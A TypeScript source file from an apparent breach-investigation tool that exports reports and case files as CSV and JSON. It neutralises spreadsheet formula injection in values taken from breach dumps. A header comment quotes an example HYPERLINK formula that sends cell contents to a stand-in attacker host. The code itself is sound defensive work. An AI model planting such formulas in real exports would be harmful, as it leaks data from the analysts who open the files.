// Getting the data out.
//
// A report that can only be read in the tab that produced it is not a deliverable. An
// investigator puts findings in a case file, a spreadsheet, a document somebody else
// signs, so the report leaves as CSV and as JSON, generated from the same object the
// screen renders, with nothing added and nothing dropped.
//
// ONE THING HERE IS A SECURITY CONTROL, NOT FORMATTING.
//
// Every value in this export came out of a breach dump, which means it was written by
// whoever assembled the dump. A spreadsheet treats a cell beginning `=`, `+`, `-`, `@`
// or a tab as a FORMULA, and formulas in Excel and Sheets can call out to a URL, read
// other cells, and in some configurations launch a process. So an exported row reading
// `=HYPERLINK("http://attacker/"&A1,"open")` is a payload that fires when the analyst
// opens the file, delivered by the security tool they were using to investigate it.
//
// Every field is therefore neutralised before it is quoted. The value is preserved
// exactly; it is prefixed so the spreadsheet reads it as text.

import type { SearchReport, Finding } from "./report";

/** Characters a spreadsheet will treat as the start of a formula. */
const FORMULA_START = /^[=+\-@\t\r]/;

/**
 * Make one field safe to open in a spreadsheet, without changing what it says.
 *
 * The leading apostrophe is the documented way to force a cell to text; it is not
 * displayed and it survives a round trip back out. Truncating or stripping the value
 * would be worse, this is evidence, and evidence that has been quietly edited is not
 * evidence.
 */
export function csvField(value: unknown): string {
  let v = value === null || value === undefined ? "" : String(value);
  if (FORMULA_START.test(v)) v = "'" + v;
  // a quote inside a quoted field is doubled; that is the whole of RFC 4180 escaping
  return `"${v.replace(/"/g, '""')}"`;
}

const row = (cells: unknown[]) => cells.map(csvField).join(",");

export interface ExportOpts {
  /** include the raw rows as the source returned them, not only the classified fields */
  records?: boolean;
}

/**
 * The report as a table, one line per fact.
 *
 * Long rather than wide: a column per possible field would be mostly empty and would
 * change shape with every subject, which is unusable in a spreadsheet and impossible
 * to diff. One line per fact sorts, filters and pivots.
 */
export function toCSV(report: SearchReport, opts: ExportOpts = {}): string {
  const lines: string[] = [];
  lines.push(row(["subject", "subject_kind", "section", "source", "source_date", "field", "value", "category", "severity"]));

  const seen = (section: string, source: string, date: string, f: Finding) =>
    lines.push(row([report.subject.raw, report.subject.kind, section, source, date, f.label, f.value, f.category, f.severity]));

  for (const s of report.sources) {
    for (const f of s.findings) seen("subject", s.name, s.date || "", f);
  }
  for (const g of report.candidates || []) {
    for (const f of g.findings) seen(`candidate:${g.anchor}`, f.source, "", f);
  }
  for (const g of report.others || []) {
    for (const f of g.findings) seen(`other:${g.anchor}`, f.source, "", f);
  }

  if (opts.records) {
    // The rows verbatim, with the dump's own column names, including the fields the
    // classifier drops as metadata. Appended rather than merged so the two halves stay
    // tellable apart in one file.
    lines.push("");
    lines.push(row(["database", "attribution", "column", "value"]));
    for (const g of report.records || []) {
      g.rows.forEach((r, i) => {
        for (const [k, v] of Object.entries(r)) {
          lines.push(row([g.database, g.attribution[i] || "", k, v]));
        }
      });
    }
  }

  return lines.join("\r\n");
}

/**
 * The report as it is, plus what produced it.
 *
 * The query is included because a report without the question it answers cannot be
 * checked, reproduced, or defended six months later.
 */
export function toJSON(report: SearchReport, meta?: Record<string, unknown>): string {
  return JSON.stringify({ exportedFrom: "octopus-csirt", query: meta ?? null, report }, null, 2);
}

/** A filename that sorts by date and says what it is without being opened. */
export function exportName(report: SearchReport, ext: string, now = new Date()): string {
  const stamp = now.toISOString().slice(0, 19).replace(/[:T]/g, "-");
  const subject = report.subject.canonical.replace(/[^a-z0-9@._+-]+/gi, "_").slice(0, 48) || "subject";
  return `octopus-${subject}-${stamp}.${ext}`;
}

// ---- a case, out of the tool ---------------------------------------------------------
//
// A case file that cannot leave is not an incident record. It has to go into the ticket,
// the handover, the thing somebody signs, and it has to carry its provenance with it:
// which analyst pinned which fact, out of which database, and when.
//
// The same formula neutralisation applies and for a sharper reason here. Every pinned
// value came out of a breach dump, so it was written by whoever assembled the dump, and
// a case export is opened in a spreadsheet by an incident responder under time pressure.
// That is the best possible moment to land a payload on somebody.

import type { CaseFile, CaseEntity, CaseFact, Board } from "./casework";

export function caseToCSV(file: CaseFile, entities: CaseEntity[], facts: CaseFact[]): string {
  const at = (t?: number) => (t ? new Date(t).toISOString() : "");
  const byId = new Map(entities.map((e) => [e.id, e]));
  const lines: string[] = [];

  lines.push(row(["case", "title", "status", "opened_by", "opened_at", "closed_at"]));
  lines.push(row([file.ref, file.title, file.status, file.openedBy, at(file.openedAt), at(file.closedAt)]));
  lines.push("");

  lines.push(row(["selector_kind", "selector", "label", "added_at"]));
  for (const e of entities) lines.push(row([e.kind, e.value, e.label || "", at(e.addedAt)]));
  lines.push("");

  lines.push(row(["selector", "field", "value", "category", "severity", "source", "pinned_by", "pinned_at", "note"]));
  for (const f of facts) {
    const e = byId.get(f.entityId);
    lines.push(row([e?.label || e?.value || f.entityId, f.label, f.value, f.category, f.severity, f.source, f.addedBy, at(f.addedAt), f.note || ""]));
  }
  return lines.join("\r\n");
}

/**
 * The whole case, including what the board concluded from it.
 *
 * The board is DERIVED, so including it is including a snapshot of an opinion rather
 * than a fact. It is in here anyway, marked as derived, because an incident record that
 * says "these three selectors were treated as one person" has to be able to show what
 * that was based on six months later, when the code that drew the conclusion has moved on.
 */
export function caseToJSON(file: CaseFile, entities: CaseEntity[], facts: CaseFact[], board: Board, by: string): string {
  return JSON.stringify({
    exportedFrom: "octopus-csirt",
    exportedBy: by,
    exportedAt: new Date().toISOString(),
    case: file,
    entities,
    facts,
    derived: {
      note: "Computed from the facts above at export time, not stored. It is a conclusion, not evidence.",
      components: board.graph.components,
      loadBearing: board.loadBearing,
      network: board.network,
      devices: board.devices.map((d) => ({ agent: d.agent.raw, read: d.agent, entities: d.entities, sources: d.sources })),
      location: board.geo,
      locationLine: board.geoLine,
      timeline: board.timeline,
      gaps: board.gaps,
    },
  }, null, 2);
}

export function caseExportName(file: CaseFile, ext: string, now = new Date()): string {
  const ref = file.ref.replace(/[^a-z0-9._-]+/gi, "_").slice(0, 48) || "case";
  return `case-${ref}-${now.toISOString().slice(0, 10)}.${ext}`;
}
